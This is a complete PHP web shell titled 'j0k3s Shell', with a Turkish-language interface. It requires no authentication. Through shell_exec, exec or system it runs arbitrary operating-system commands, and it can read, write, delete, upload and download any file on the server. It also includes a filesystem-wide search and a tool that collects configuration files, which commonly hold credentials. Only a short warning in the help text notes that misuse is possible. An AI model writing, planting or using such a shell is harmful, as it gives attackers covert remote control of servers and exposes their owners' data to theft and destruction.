<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

function executeCommand($cmd) {
    $output = '';
    $cmd_parts = explode(' ', trim($cmd));
    
    if ($cmd_parts[0] === 'cd') {
        if (isset($cmd_parts[1])) {
            $new_dir = realpath($_SESSION['current_dir'] . '/' . $cmd_parts[1]);
            if ($new_dir !== false && is_dir($new_dir)) {
                $_SESSION['current_dir'] = $new_dir;
                $output = "Dizin değiştirildi: " . $new_dir;
            } else {
                $output = "Geçersiz dizin: " . $cmd_parts[1];
            }
        } else {
            $output = "Mevcut dizin: " . $_SESSION['current_dir'];
        }
    } else {
        $full_cmd = "cd " . escapeshellarg($_SESSION['current_dir']) . " && " . $cmd . " 2>&1";
        
        if (function_exists('shell_exec')) {
            $output = shell_exec($full_cmd);
        } elseif (function_exists('exec')) {
            exec($full_cmd, $output_array, $return_var);
            $output = implode("\n", $output_array);
        } elseif (function_exists('system')) {
            ob_start();
            system($full_cmd, $return_var);
            $output = ob_get_clean();
        } else {
            $output = "Komut çalıştırılamadı: Gerekli fonksiyonlar devre dışı.";
        }
    }
    
    return $output === null || $output === '' ? "Komut çalıştırıldı, ancak çıktı alınamadı." : $output;
}

function fileManager($action, $path = null, $content = null) {
    switch ($action) {
        case 'list':
            $files = scandir($_SESSION['current_dir']);
            $output = "<table><tr><th>İsim</th><th>Boyut</th><th>İzinler</th><th>İşlemler</th></tr>";
            foreach ($files as $file) {
                if ($file != "." && $file != "..") {
                    $fullPath = $_SESSION['current_dir'] . '/' . $file;
                    $isDir = is_dir($fullPath);
                    $size = $isDir ? '-' : filesize($fullPath) . ' B';
                    $perms = getFilePermissions($fullPath);
                    $output .= "<tr><td>" . ($isDir ? "📁" : "📄") . " $file</td><td>$size</td><td>$perms</td>";
                    $output .= "<td><a href='#' onclick='readFile(\"$fullPath\")'>Oku</a> | ";
                    $output .= "<a href='#' onclick='deleteFile(\"$fullPath\")'>Sil</a> | ";
                    $output .= "<a href='?action=filemanager&subaction=download&path=" . urlencode($fullPath) . "'>İndir</a></td></tr>";
                }
            }
            $output .= "</table>";
            return $output;
        case 'read':
            if (file_exists($path) && !is_dir($path)) {
                $content = htmlspecialchars(file_get_contents($path));
                return "<h3>Dosya İçeriği: " . htmlspecialchars($path) . "</h3><pre>$content</pre>";
            }
            return "Dosya bulunamadı veya okunamadı.";
        case 'write':
            if (file_put_contents($path, $content) !== false) {
                return "Dosya başarıyla yazıldı.";
            }
            return "Dosya yazılamadı.";
        case 'delete':
            if (is_dir($path)) {
                if (rmdir($path)) {
                    return "Dizin silindi.";
                }
            } elseif (unlink($path)) {
                return "Dosya silindi.";
            }
            return "Dosya veya dizin silinemedi.";
        case 'search':
            $keyword = $content;
            $results = [];
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator('/', RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST,
                RecursiveIteratorIterator::CATCH_GET_CHILD
            );
            foreach ($iterator as $file) {
                if ($file->isFile() && stripos($file->getPathname(), $keyword) !== false) {
                    $results[] = $file->getPathname();
                }
            }
            return "Arama Sonuçları:<br>" . implode("<br>", $results);
        case 'permissions':
            $perms = getFilePermissions($path);
            return "Dosya İzinleri: $perms";
        case 'upload':
            if (isset($_FILES['file'])) {
                $uploadfile = $_SESSION['current_dir'] . '/' . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                    return "Dosya başarıyla yüklendi.";
                } else {
                    return "Dosya yüklenemedi.";
                }
            }
            return "Dosya seçilmedi.";
        case 'download':
            if (file_exists($path) && !is_dir($path)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($path).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($path));
                readfile($path);
                exit;
            }
            return "Dosya bulunamadı.";
        case 'find_config':
            $results = [];
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator('/', RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST,
                RecursiveIteratorIterator::CATCH_GET_CHILD
            );
            $configExtensions = ['ini', 'conf', 'cfg', 'config', 'json', 'xml', 'yml', 'yaml'];
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $extension = strtolower($file->getExtension());
                    if (in_array($extension, $configExtensions) || strpos(strtolower($file->getFilename()), 'config') !== false) {
                        $results[] = $file->getPathname();
                    }
                }
            }
            return "Bulunan Konfigürasyon Dosyaları:<br>" . implode("<br>", $results);
        default:
            return "Geçersiz dosya yönetimi işlemi.";
    }
}

function getFilePermissions($file) {
    $perms = fileperms($file);
    $info = '';

    // Dosya türü
    switch ($perms & 0xF000) {
        case 0xC000: $info = 'S'; break; // Soket
        case 0xA000: $info = 'L'; break; // Sembolik Bağlantı
        case 0x8000: $info = '-'; break; // Normal
        case 0x6000: $info = 'B'; break; // Blok özel
        case 0x4000: $info = 'D'; break; // Dizin
        case 0x2000: $info = 'C'; break; // Karakter özel
        case 0x1000: $info = 'P'; break; // FIFO pipe
        default: $info = 'U'; break; // Bilinmeyen
    }

    // Sahibi
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

    // Grup
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

    // Dünya
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' || isset($_GET['action'])) {
    $action = $_POST['action'] ?? $_GET['action'] ?? '';
    $output = '';

    switch ($action) {
        case 'execute':
            $cmd = $_POST['cmd'] ?? '';
            $output = executeCommand($cmd);
            break;
        case 'filemanager':
            $subaction = $_POST['subaction'] ?? $_GET['subaction'] ?? '';
            $path = $_POST['path'] ?? $_GET['path'] ?? null;
            $content = $_POST['content'] ?? null;
            $output = fileManager($subaction, $path, $content);
            break;
    }

    if ($action !== 'filemanager' || $subaction !== 'download') {
        echo $output;
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>j0k3s Shell</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        #shell {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 30px;
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
        }
        #ascii-art {
            font-family: monospace;
            white-space: pre;
            text-align: center;
            font-size: 10px;
            color: #7f8c8d;
            margin-bottom: 30px;
        }
        #current-dir-display {
            margin-bottom: 20px;
            font-weight: bold;
            background-color: #ecf0f1;
            padding: 10px;
            border-radius: 4px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #bdc3c7;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            padding: 10px 20px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2980b9;
        }
        #output {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 15px;
            min-height: 150px;
            white-space: pre-wrap;
            font-family: monospace;
            font-size: 14px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <div id="shell">
        <h1>j0k3s Shell</h1>
        <div id="ascii-art">
 __..____ ___  ____ _________|  | _____ _______ 
<   |  |\__  \\  \/ /  |  \___   /  | \__  \\_  __ \
 \___  | / __ \\   /|  |  //    /|  |/ __ \|  | \/
 / ___|___  /\/ |//____ \________  /|   
 \/          \/                 \/         \/       
        </div>
        <div id="current-dir-display">Mevcut Dizin: <?php echo htmlspecialchars($_SESSION['current_dir']); ?></div>
        
        <div class="form-group">
            <input type="text" id="cmd" placeholder="Komut girin">
            <button onclick="executeCommand()">Çalıştır</button>
        </div>

        <div class="form-group">
            <button onclick="listFiles()">Dosya Yöneticisi</button>
            <button onclick="showSearchForm()">Dosya Ara</button>
            <button onclick="showPermissionsForm()">Dosya İzinleri</button>
            <button onclick="showUploadForm()">Dosya Yükle</button>
            <button onclick="showDownloadForm()">Dosya İndir</button>
            <button onclick="findConfigFiles()">Konf. Bul</button>
            <button onclick="showHelp()">Yardım</button>
        </div>

        <div id="output"></div>
    </div>

    <script>
        function executeCommand() {
            const cmd = document.getElementById('cmd').value;
            sendRequest('execute', { cmd: cmd });
        }

        function listFiles() {
            sendRequest('filemanager', { subaction: 'list' });
        }

        function readFile(path) {
            sendRequest('filemanager', { subaction: 'read', path: path });
        }

        function deleteFile(path) {
            if (confirm('Bu dosyayı silmek istediğinizden emin misiniz?')) {
                sendRequest('filemanager', { subaction: 'delete', path: path });
            }
        }

        function showSearchForm() {
            const form = `
                <h3>Dosya Ara</h3>
                <input type="text" id="search-keyword" placeholder="Aranacak kelime">
                <button onclick="searchFiles()">Ara</button>
            `;
            document.getElementById('output').innerHTML = form;
        }

        function searchFiles() {
            const keyword = document.getElementById('search-keyword').value;
            sendRequest('filemanager', { subaction: 'search', content: keyword });
        }

        function showPermissionsForm() {
            const form = `
                <h3>Dosya İzinleri</h3>
                <input type="text" id="permissions-path" placeholder="Dosya yolu">
                <button onclick="getPermissions()">İzinleri Göster</button>
            `;
            document.getElementById('output').innerHTML = form;
        }

        function getPermissions() {
            const path = document.getElementById('permissions-path').value;
            sendRequest('filemanager', { subaction: 'permissions', path: path });
        }

        function showUploadForm() {
            const form = `
                <h3>Dosya Yükle</h3>
                <form id="upload-form" enctype="multipart/form-data">
                    <input type="file" name="file" required>
                    <button type="submit">Yükle</button>
                </form>
            `;
            document.getElementById('output').innerHTML = form;
            document.getElementById('upload-form').onsubmit = function(e) {
                e.preventDefault();
                uploadFile();
            };
        }

        function uploadFile() {
            const formData = new FormData(document.getElementById('upload-form'));
            formData.append('action', 'filemanager');
            formData.append('subaction', 'upload');
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                document.getElementById('output').innerHTML = result;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        function showDownloadForm() {
            const form = `
                <h3>Dosya İndir</h3>
                <input type="text" id="download-path" placeholder="Dosya yolu">
                <button onclick="downloadFile()">İndir</button>
            `;
            document.getElementById('output').innerHTML = form;
        }

        function downloadFile() {
            const path = document.getElementById('download-path').value;
            window.location.href = ?action=filemanager&subaction=download&path=${encodeURIComponent(path)};
        }

        function findConfigFiles() {
            sendRequest('filemanager', { subaction: 'find_config' });
        }

        function showHelp() {
            const helpText = `
                <h3>j0k3s Shell Yardım</h3>
                <p><strong>Komut Çalıştırma:</strong> Üst kısımdaki metin kutusuna bir sistem komutu girin (örneğin: 'ls', 'pwd', 'whoami') ve "Çalıştır" butonuna tıklayın. Komutun çıktısı alt kısımda görüntülenecektir.</p>
                
                <p><strong>Dosya Yöneticisi:</strong> Bu buton, mevcut dizindeki dosya ve klasörleri listeler. Her dosya için okuma, silme ve indirme seçenekleri sunulur.</p>
                
                <p><strong>Dosya Ara:</strong> Tüm dosya sistemi içinde belirli bir dosya adını veya dosya adının bir kısmını aramak için kullanılır. Arama sonuçları tam dosya yolları ile birlikte listelenir.</p>
                
                <p><strong>Dosya İzinleri:</strong> Belirtilen dosya veya dizinin izinlerini gösterir. İzinler, Unix tarzı izin notasyonu ile gösterilir (örneğin: rwxr-xr-x).</p>
                
                <p><strong>Dosya Yükle:</strong> Yerel bilgisayarınızdan sunucuya dosya yüklemek için kullanılır. Yüklenecek dosyayı seçin ve "Yükle" butonuna tıklayın.</p>
                
                <p><strong>Dosya İndir:</strong> Sunucudan dosya indirmek için kullanılır. İndirilecek dosyanın tam yolunu girin ve "İndir" butonuna tıklayın.</p>
                
                <p><strong>Konf. Bul:</strong> Sistem genelinde yaygın konfigürasyon dosyalarını (örneğin: .ini, .conf, .cfg, .json, .xml dosyaları) arar ve listeler. Bu, sistem yapılandırmasını incelemek için kullanışlıdır.</p>
                
                <p><strong>İzin Açıklamaları:</strong></p>
                <ul>
                    <li>r: Okuma izni (Dosya içeriğini görüntüleme veya dizin içeriğini listeleme)</li>
                    <li>w: Yazma izni (Dosya içeriğini değiştirme veya dizine dosya ekleme/silme)</li>
                    <li>x: Çalıştırma izni (Dosyayı çalıştırma veya dizine erişim)</li>
                    <li>-: İlgili izin yok</li>
                    <li>s: SetUID/SetGID biti (Dosya çalıştırıldığında farklı bir kullanıcı veya grup kimliği ile çalışır)</li>
                    <li>t: Sticky bit (Genellikle dizinlerde kullanılır, sadece dosya sahibinin dosyayı silebileceğini belirtir)</li>
                </ul>
                
                <p><strong>Güvenlik Uyarısı:</strong> Bu araç, sistem üzerinde geniş yetkilerle çalışmaktadır. Yanlış kullanım, sistem güvenliğini tehlikeye atabilir veya veri kaybına neden olabilir. Sadece yetkili olduğunuz sistemlerde ve dikkatli bir şekilde kullanın.</p>
            `;
            document.getElementById('output').innerHTML = helpText;
        }

        function sendRequest(action, data) {
            data.action = action;
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams(data)
            })
            .then(response => response.text())
            .then(result => {
                document.getElementById('output').innerHTML = result;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>